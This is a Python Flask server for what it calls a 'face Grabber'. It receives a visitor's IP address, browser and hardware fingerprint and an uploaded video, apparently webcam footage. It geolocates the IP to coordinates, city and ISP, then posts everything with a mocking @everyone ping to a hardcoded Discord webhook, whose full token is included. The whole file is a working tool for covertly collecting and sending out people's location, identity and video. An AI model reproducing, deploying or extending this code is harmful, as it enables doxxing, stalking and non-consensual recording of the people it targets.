import json, requests, os
from flask import Flask, render_template, request, jsonify
from datetime import datetime, timezone

app = Flask(__name__)
#  
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/1470108908256493761/5Bi0WcX4vsCLi9M5326YUSHTEAhYKP0zolSpBQUQCAdQPW4LMtsqCqxQOj8ZIc2gjDCD")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    info = json.loads(request.form.get('info', '{}'))
    video_file = request.files.get('video')
    
    # 
    target_ip = info.get('ip', 'Unknown')
    
    # 【】
    geo = requests.get(f"http://ip-api.com/json/{target_ip}?fields=66846719").json()
    
    fields = [
        {"name": "🌐 [IPアドレス]", "value": f"`{target_ip}`", "inline": True},
        {"name": "📶 [回線種別]", "value": f"モバイル: `{geo.get('mobile')}` / VPN: `{geo.get('proxy')}`", "inline": True},
        {"name": "📍 [座標/住所]", "value": f"座標: `{geo.get('lat')}, {geo.get('lon')}`\n住所: `{geo.get('country')} {geo.get('city')}`\nISP: `{geo.get('isp')}`", "inline": False},
        {"name": "🌍 [ブラウザ/地域]", "value": f"ブラウザ: `{info.get('browser_type')}`\n言語: `{info.get('lang')}`\n地域(TZ): `{info.get('tz')}`", "inline": False},
        {"name": "💻 [ハードウェア]", "value": f"GPU: `{info.get('gpu')}`\nCPU: `{info.get('cores')}コア` / RAM: `{info.get('mem')}GB`", "inline": False},
        {"name": "🕵️ [偽装判定]", "value": f"Chrome系: `{info.get('is_chrome')}` / Safari系: `{info.get('is_safari')}`\nAudioID: `{info.get('audio_id')}`", "inline": False}
    ]

    payload = {
        "content": "###  ||@everyone||[なにしてんのｗｗｗ]",
        "embeds": [{
            "title": "kanikama face Grabber BETA owner@kointyanotp",
            "color": 0xFFFFFF,
            "fields": fields,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }]
    }

    files = {"video": (video_file.filename, video_file.read(), "video/webm")} if video_file else {}
    requests.post(WEBHOOK_URL, data={"payload_json": json.dumps(payload)}, files=files)
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)